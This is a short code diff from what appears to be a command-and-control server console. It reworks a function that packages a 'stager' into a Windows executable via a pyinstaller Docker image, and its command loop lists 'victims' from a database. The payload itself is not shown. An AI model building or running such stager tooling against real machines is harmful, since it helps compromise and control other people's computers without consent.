@@ -40,11 +40,17 @@ def generate_stager():
 	if os.path.exists('./tmp'):
 		shutil.rmtree('./tmp')
 
+
+	## For linux bianry : docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux
 	os.mkdir('./tmp')
-	subprocess.call('cp stager.spec tmp',shell=True)
-	subprocess.call('cp requirements.txt tmp',shell=True)
-	subprocess.call('cp stager.py tmp',shell=True)
-	subprocess.call('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows', cwd=r"./tmp",shell=True)
+	try:
+		subprocess.check_output('cp stager.spec tmp',shell=True)
+		subprocess.check_output('cp requirements.txt tmp',shell=True)
+		subprocess.check_output('cp stager.py tmp',shell=True)
+		subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=r"./tmp",shell=True)
+		print(colored("exe dumped to ./tmp",'green'))
+	except subprocess.CalledProcessError as grepexc:                                                                                                   
+		print(colored(f"exe generation failed ","red"))
 
 
 def main(args,db_object,server_logger):
@@ -76,7 +82,7 @@ def main(args,db_object,server_logger):
 
 		elif cmd == 'generate':
 			generate_stager()
-			print("exe dumped to ./tmp")
+			
 
 		elif cmd == 'victims':
 			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
